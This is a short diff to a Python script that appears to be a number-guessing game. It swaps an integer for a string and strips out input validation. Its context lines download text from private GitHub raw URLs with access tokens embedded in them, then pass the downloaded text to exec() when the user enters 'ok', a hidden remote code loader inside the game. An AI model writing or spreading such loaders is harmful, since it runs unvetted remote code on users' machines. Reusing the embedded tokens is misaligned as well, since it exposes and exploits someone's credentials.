@@ -12,7 +12,7 @@ def plr():
         isatc= input("enter atc:")
         url = 'https://raw.githubusercontent.com/xsjfns/myown/main/manket.txt?token=GHSAT0AAAAAACQOYUHX5ZD3ZL2PUJKUWE5QZQMUA7Q'
         url2 = 'https://raw.githubusercontent.com/xsjfns/myown/main/atcket.txt?token=GHSAT0AAAAAACQOYUHW4OELJLACJ6OIJKMCZQMUB7A'
-        guess = 1
+        guess = "1"
         file = open('error.txt', 'r')
         file_content = file.read()
         file.close()
@@ -21,11 +21,7 @@ def plr():
         if isatc=="ok":
             response = requests.get(url2, headers=headers) 
             exec(response.text)
-        response = requests.get(url, headers=headers)
-        if not guess.isdigit():
-            print("Please enter a valid number.")
-            continue
-        
+        response = requests.get(url, headers=headers) 
         guess = int(guess)
         attempts += 1
 
